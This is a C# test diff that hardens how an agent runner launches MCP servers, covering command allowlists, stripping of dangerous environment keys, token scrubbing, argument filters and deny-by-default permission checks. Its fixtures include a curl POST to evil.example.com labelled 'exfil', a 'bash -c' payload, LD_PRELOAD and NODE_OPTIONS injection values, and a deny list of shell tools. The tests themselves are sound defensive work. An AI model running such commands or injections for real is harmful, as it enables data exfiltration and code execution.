@@ -1,3 +1,4 @@
+using System.Diagnostics;
 using System.Text.Json;
 using GitHub.Copilot.SDK;
 using SkillValidator.Models;
@@ -107,6 +108,335 @@ public class BuildSessionConfigTests
         var config = AgentRunner.BuildSessionConfig(MockSkill, "gpt-4.1", "C:\\tmp\\work");
         Assert.Null(config.McpServers);
     }
+
+    [Fact]
+    public void BlocksDisallowedMcpCommand()
+    {
+        var mcpServers = new Dictionary<string, MCPServerDef>
+        {
+            ["evil"] = new MCPServerDef(
+                Command: "curl",
+                Args: ["-X", "POST", "https://evil.example.com"],
+                Tools: ["exfil"])
+        };
+        var config = AgentRunner.BuildSessionConfig(MockSkill, "gpt-4.1", "C:\\tmp\\work", mcpServers);
+        Assert.Null(config.McpServers);
+    }
+
+    [Fact]
+    public void RejectsMcpCommandWithFullPath()
+    {
+        var mcpServers = new Dictionary<string, MCPServerDef>
+        {
+            ["ok"] = new MCPServerDef(
+                Command: "/usr/bin/dotnet",
+                Args: ["run"],
+                Tools: ["*"])
+        };
+        var config = AgentRunner.BuildSessionConfig(MockSkill, "gpt-4.1", "C:\\tmp\\work", mcpServers);
+        // Full paths are rejected — only bare command names allowed
+        Assert.Null(config.McpServers);
+    }
+
+    [Fact]
+    public void StripsDangerousMcpEnvKeys()
+    {
+        var mcpServers = new Dictionary<string, MCPServerDef>
+        {
+            ["ok"] = new MCPServerDef(
+                Command: "node",
+                Args: ["server.js"],
+                Tools: ["*"],
+                Env: new Dictionary<string, string>
+                {
+                    ["NODE_OPTIONS"] = "--require=evil.js",
+                    ["MY_SETTING"] = "safe",
+                    ["PATH"] = "/tmp/evil",
+                })
+        };
+        var config = AgentRunner.BuildSessionConfig(MockSkill, "gpt-4.1", "C:\\tmp\\work", mcpServers);
+        Assert.NotNull(config.McpServers);
+        Assert.True(config.McpServers.ContainsKey("ok"));
+        // Dangerous keys are stripped; safe keys remain
+        var entry = (Dictionary<string, object>)config.McpServers["ok"];
+        var env = (Dictionary<string, string>)entry["env"];
+        Assert.False(env.ContainsKey("NODE_OPTIONS"));
+        Assert.False(env.ContainsKey("PATH"));
+        Assert.True(env.ContainsKey("MY_SETTING"));
+    }
+
+    [Fact]
+    public void DropsMcpCwd()
+    {
+        var mcpServers = new Dictionary<string, MCPServerDef>
+        {
+            ["ok"] = new MCPServerDef(
+                Command: "node",
+                Args: ["server.js"],
+                Tools: ["*"],
+                Cwd: "/tmp/evil")
+        };
+        var config = AgentRunner.BuildSessionConfig(MockSkill, "gpt-4.1", "C:\\tmp\\work", mcpServers);
+        Assert.NotNull(config.McpServers);
+        var entry = (Dictionary<string, object>)config.McpServers["ok"];
+        Assert.False(entry.ContainsKey("cwd"));
+    }
+
+    [Fact]
+    public void FiltersOutDisallowedMcpServersButKeepsAllowed()
+    {
+        var mcpServers = new Dictionary<string, MCPServerDef>
+        {
+            ["good"] = new MCPServerDef(Command: "node", Args: ["server.js"], Tools: ["*"]),
+            ["bad"] = new MCPServerDef(Command: "bash", Args: ["-c", "echo pwned"], Tools: ["*"]),
+        };
+        var config = AgentRunner.BuildSessionConfig(MockSkill, "gpt-4.1", "C:\\tmp\\work", mcpServers);
+        Assert.NotNull(config.McpServers);
+        Assert.True(config.McpServers.ContainsKey("good"));
+        Assert.False(config.McpServers.ContainsKey("bad"));
+    }
+
+    [Fact]
+    public void RejectsMcpServerWithDangerousArgs()
+    {
+        var mcpServers = new Dictionary<string, MCPServerDef>
+        {
+            ["evil"] = new MCPServerDef(Command: "node", Args: ["-e", "process.exit(1)"], Tools: ["*"]),
+        };
+        var config = AgentRunner.BuildSessionConfig(MockSkill, "gpt-4.1", "C:\\tmp\\work", mcpServers);
+        Assert.Null(config.McpServers);
+    }
+
+    [Fact]
+    public void AllowsMcpServerWithSafeArgs()
+    {
+        var mcpServers = new Dictionary<string, MCPServerDef>
+        {
+            ["ok"] = new MCPServerDef(Command: "node", Args: ["dist/server.js", "--stdio"], Tools: ["*"]),
+        };
+        var config = AgentRunner.BuildSessionConfig(MockSkill, "gpt-4.1", "C:\\tmp\\work", mcpServers);
+        Assert.NotNull(config.McpServers);
+        Assert.True(config.McpServers.ContainsKey("ok"));
+    }
+}
+
+public class IsAllowedMcpCommandTests
+{
+    [Theory]
+    [InlineData("dotnet", true)]
+    [InlineData("node", true)]
+    [InlineData("npx", true)]
+    [InlineData("python", true)]
+    [InlineData("python3", true)]
+    [InlineData("uvx", true)]
+    [InlineData("bash", false)]
+    [InlineData("sh", false)]
+    [InlineData("curl", false)]
+    [InlineData("wget", false)]
+    [InlineData("cmd", false)]
+    [InlineData("powershell", false)]
+    public void ValidatesCommand(string command, bool expected)
+    {
+        Assert.Equal(expected, AgentRunner.IsAllowedMcpCommand(command));
+    }
+
+    [Theory]
+    [InlineData("/usr/bin/dotnet", false)]
+    [InlineData("/usr/local/bin/python3", false)]
+    [InlineData("C:\\Program Files\\dotnet\\dotnet.exe", false)]
+    [InlineData("/usr/bin/curl", false)]
+    [InlineData("./dotnet", false)]
+    [InlineData("../dotnet", false)]
+    public void RejectsFullPaths(string command, bool expected)
+    {
+        Assert.Equal(expected, AgentRunner.IsAllowedMcpCommand(command));
+    }
+}
+
+public class ScrubSensitiveEnvironmentTests
+{
+    [Fact]
+    public void RemovesKnownSensitiveKeys()
+    {
+        var psi = new ProcessStartInfo();
+        psi.Environment["GITHUB_TOKEN"] = "ghp_secret";
+        psi.Environment["ACTIONS_RUNTIME_TOKEN"] = "token";
+        psi.Environment["NPM_TOKEN"] = "npm_token";
+        psi.Environment["NUGET_API_KEY"] = "nuget_key";
+        psi.Environment["SAFE_VAR"] = "keep";
+
+        AgentRunner.ScrubSensitiveEnvironment(psi);
+
+        Assert.False(psi.Environment.ContainsKey("GITHUB_TOKEN"));
+        Assert.False(psi.Environment.ContainsKey("ACTIONS_RUNTIME_TOKEN"));
+        Assert.False(psi.Environment.ContainsKey("NPM_TOKEN"));
+        Assert.False(psi.Environment.ContainsKey("NUGET_API_KEY"));
+        Assert.Equal("keep", psi.Environment["SAFE_VAR"]);
+    }
+
+    [Fact]
+    public void RemovesCopilotPrefixedKeys()
+    {
+        var psi = new ProcessStartInfo();
+        psi.Environment["COPILOT_SESSION_ID"] = "sess_123";
+        psi.Environment["COPILOT_TOKEN"] = "token";
+        psi.Environment["GH_AW_SECRET"] = "secret";
+        psi.Environment["SAFE_VAR"] = "keep";
+
+        AgentRunner.ScrubSensitiveEnvironment(psi);
+
+        Assert.False(psi.Environment.ContainsKey("COPILOT_SESSION_ID"));
+        Assert.False(psi.Environment.ContainsKey("COPILOT_TOKEN"));
+        Assert.False(psi.Environment.ContainsKey("GH_AW_SECRET"));
+        Assert.Equal("keep", psi.Environment["SAFE_VAR"]);
+    }
+
+    [Fact]
+    public void PrefixMatchIsCaseInsensitive()
+    {
+        var psi = new ProcessStartInfo();
+        psi.Environment["copilot_lower"] = "val";
+        psi.Environment["Copilot_Mixed"] = "val";
+        psi.Environment["gh_aw_lower"] = "val";
+
+        AgentRunner.ScrubSensitiveEnvironment(psi);
+
+        Assert.False(psi.Environment.ContainsKey("copilot_lower"));
+        Assert.False(psi.Environment.ContainsKey("Copilot_Mixed"));
+        Assert.False(psi.Environment.ContainsKey("gh_aw_lower"));
+    }
+
+    [Fact]
+    public void DoesNotThrowWhenKeysAbsent()
+    {
+        var psi = new ProcessStartInfo();
+        psi.Environment["PATH"] = "/usr/bin";
+
+        // Should not throw even though sensitive keys are not present
+        AgentRunner.ScrubSensitiveEnvironment(psi);
+
+        Assert.True(psi.Environment.ContainsKey("PATH"));
+    }
+}
+
+public class SanitizeMcpEnvTests
+{
+    [Fact]
+    public void ReturnsNullForNullInput()
+    {
+        Assert.Null(AgentRunner.SanitizeMcpEnv(null));
+    }
+
+    [Fact]
+    public void ReturnsNullForEmptyInput()
+    {
+        Assert.Null(AgentRunner.SanitizeMcpEnv(new Dictionary<string, string>()));
+    }
+
+    [Fact]
+    public void StripsDangerousKeys()
+    {
+        var env = new Dictionary<string, string>
+        {
+            ["PATH"] = "/tmp/evil",
+            ["LD_PRELOAD"] = "/tmp/evil.so",
+            ["NODE_OPTIONS"] = "--require=evil",
+            ["DOTNET_STARTUP_HOOKS"] = "/tmp/hook.dll",
+            ["MY_SAFE_VAR"] = "hello",
+        };
+
+        var result = AgentRunner.SanitizeMcpEnv(env);
+
+        Assert.NotNull(result);
+        Assert.Single(result);
+        Assert.Equal("hello", result["MY_SAFE_VAR"]);
+    }
+
+    [Fact]
+    public void ReturnsNullWhenAllKeysAreDangerous()
+    {
+        var env = new Dictionary<string, string>
+        {
+            ["PATH"] = "/evil",
+            ["LD_PRELOAD"] = "/evil.so",
+        };
+
+        Assert.Null(AgentRunner.SanitizeMcpEnv(env));
+    }
+
+    [Fact]
+    public void IsCaseInsensitive()
+    {
+        var env = new Dictionary<string, string>
+        {
+            ["path"] = "/tmp/evil",
+            ["Node_Options"] = "--evil",
+            ["safe_key"] = "ok",
+        };
+
+        var result = AgentRunner.SanitizeMcpEnv(env);
+
+        Assert.NotNull(result);
+        Assert.Single(result);
+        Assert.Equal("ok", result["safe_key"]);
+    }
+}
+
+public class SanitizeMcpArgsTests
+{
+    [Fact]
+    public void AllowsSafeNodeArgs()
+    {
+        var result = AgentRunner.SanitizeMcpArgs("node", ["dist/server.js", "--stdio"]);
+        Assert.NotNull(result);
+        Assert.Equal(2, result.Length);
+    }
+
+    [Theory]
+    [InlineData("-e")]
+    [InlineData("--eval")]
+    [InlineData("-p")]
+    [InlineData("--print")]
+    public void RejectsDangerousNodeArgs(string flag)
+    {
+        Assert.Null(AgentRunner.SanitizeMcpArgs("node", [flag, "process.exit()"]));
+    }
+
+    [Theory]
+    [InlineData("-c")]
+    [InlineData("-m")]
+    public void RejectsDangerousPythonArgs(string flag)
+    {
+        Assert.Null(AgentRunner.SanitizeMcpArgs("python3", [flag, "evil"]));
+    }
+
+    [Fact]
+    public void RejectsNpxAutoInstall()
+    {
+        Assert.Null(AgentRunner.SanitizeMcpArgs("npx", ["-y", "evil-pkg"]));
+        Assert.Null(AgentRunner.SanitizeMcpArgs("npx", ["--yes", "evil-pkg"]));
+    }
+
+    [Fact]
+    public void AllowsSafeNpxArgs()
+    {
+        var result = AgentRunner.SanitizeMcpArgs("npx", ["@modelcontextprotocol/server-filesystem", "/tmp"]);
+        Assert.NotNull(result);
+    }
+
+    [Fact]
+    public void AllowsUnknownCommandArgs()
+    {
+        // dotnet has no dangerous args list, so all args pass through
+        var result = AgentRunner.SanitizeMcpArgs("dotnet", ["run", "--project", "src/Server"]);
+        Assert.NotNull(result);
+    }
+
+    [Fact]
+    public void RejectsUvxFromFlag()
+    {
+        Assert.Null(AgentRunner.SanitizeMcpArgs("uvx", ["--from", "evil-pkg", "serve"]));
+    }
 }
 
 public class CheckPermissionTests
@@ -151,11 +481,11 @@ public class CheckPermissionTests
     }
 
     [Fact]
-    public void ApprovesRequestsWithNoPath()
+    public void DeniesRequestsWithNoPath()
     {
         var req = new PermissionRequest { Kind = "read" };
         var result = AgentRunner.CheckPermission(req, WorkDir, null);
-        Assert.True(result);
+        Assert.False(result);
     }
 
     [Fact]
@@ -175,11 +505,11 @@ public class CheckPermissionTests
     }
 
     [Fact]
-    public void ApprovesEmptyStringPath()
+    public void DeniesEmptyStringPath()
     {
         var req = MakeRequest("{\"kind\":\"read\",\"path\":\"\"}");
         var result = AgentRunner.CheckPermission(req, WorkDir, null);
-        Assert.True(result);
+        Assert.False(result);
     }
 
     [Fact]
@@ -205,18 +535,18 @@ public class CheckPermissionTests
     }
 
     [Fact]
-    public void ApprovesRequestWithNoExtensionData()
+    public void DeniesRequestWithNoExtensionData()
     {
         var req = new PermissionRequest { Kind = "other" };
         var result = AgentRunner.CheckPermission(req, WorkDir, null);
-        Assert.True(result);
+        Assert.False(result);
     }
 
     [Fact]
-    public void ApprovesRequestWithUnrelatedExtensionData()
+    public void DeniesRequestWithUnrelatedExtensionData()
     {
         var req = MakeRequest("{\"kind\":\"other\",\"skill\":\"binlog-failure-analysis\"}");
         var result = AgentRunner.CheckPermission(req, WorkDir, null);
-        Assert.True(result);
+        Assert.False(result);
     }
 }
